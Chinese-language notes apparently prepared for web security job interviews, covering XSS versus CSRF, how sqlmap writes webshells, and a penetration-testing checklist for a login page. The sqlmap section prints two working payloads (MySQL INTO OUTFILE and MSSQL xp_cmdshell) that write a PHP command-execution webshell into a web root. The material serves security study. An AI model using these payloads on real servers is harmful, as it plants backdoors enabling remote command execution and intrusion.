## 0x00 简介
这里记录一些 Web 安全常见面试题目。

## 0x01 XSS和CSRF区别

XSS是跨站脚本攻击，CSRF是跨站请求伪造。  
首先，二者攻击方式不同。XSS攻击方式是向Web页面注入恶意脚本，当用户浏览被感染的页面时，恶意脚本在用户浏览器中执行，从而获取敏感信息或控制用户。
CSRF攻击的核心是利用用户身份信息伪造请求，攻击者通过诱导用户访问一个恶意网站或点击某些链接，迫使用户在已登录的情况下向受害网站发起伪造请求，执行非授权操作。  

其次，二者攻击目标不同，XSS主要目标是用户，CSRF的主要目标是服务端。  
然后，XSS需要找到可以插入并执行恶意脚本的地方，通常发生在输入输出不安全的情况下。CSRF攻击依赖于用户的登陆状态，一般在没有CSRF防御机制的站点利用。  
最后，防御方式上，XSS常见的防御措施包括对输入输出的过滤和转义，避免在网页中直接插入用户输入数据。CSRF常见的防御措施是在表单和重要请求中加入CSRF令牌。

## 0x02 sqlmap中写入webshell的原理
sqlmap利用sql注入漏洞，通过数据库的读写权限将恶意的webshell代码写入服务器上的可访问目录中，数据库服务器要具备一定的写权限，mysql数据库的 into outfile ； MSSQL 的xp_cmdshell等。
payload：
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';

```

## 0x03 给定一个登陆页面，有什么渗透思路？
一、信息收集
首先 burp 抓包分析HTTP请求和响应，查看请求的表单、请求体、响应包等信息，分析传输数据和关键参数；识别登陆页面的开发技术栈，比如是否使用了特定的CMS、前端框架、后端开发语言等。

二、身份验证机制
弱口令测试，测试分析账户锁定机制，能否暴力破解等。

三、SQL注入
尝试在用户名和密码位置输入恶意sql注入测试语句，判断是否存在sql注入漏洞，可以结合burp的sqlmap插件。

四、XML注入
如果使用XML格式传输登录数据，可以测试XML注入或XXE（外部实体注入）。

五、命令注入
如果登录表单提交处理存在服务器命令执行漏洞，可以尝试命令注入，检查数据包中是否有相关命令传输，然后进行命令执行漏洞测试。

六、越权漏洞
是否存在 admin、level、id 等关键参数，修改这些参数使我们跳转到管理员后台界面，或者能冒充管理员权限。

七、密码重置机制
测试密码重置的流程，看URL和数据包中是否存在相关逻辑漏洞，可以无密码重置，或重置任意用户密码。

八、XSS
在输入字段中插入恶意脚本，查看是否有反射性XSS，特别是在登录失败时的错误信息中。

九、CSRF
检查登录表单是否存在CSRF漏洞，通过修改登录表单中的Token或请求头，尝试发起跨站请求伪造攻击。可以使用Burp Suite的CSRF插件进行检测。检查提交的数据是否包含一个随机生成的 Token（通常称为 csrf_token、authenticity_token 等）。如果没有找到这样的 Token，表单可能缺少 CSRF 防护。

十、会话管理和cookie安全
查看是否存在多因素认证，查看会话令牌强度和会话超时管理等。
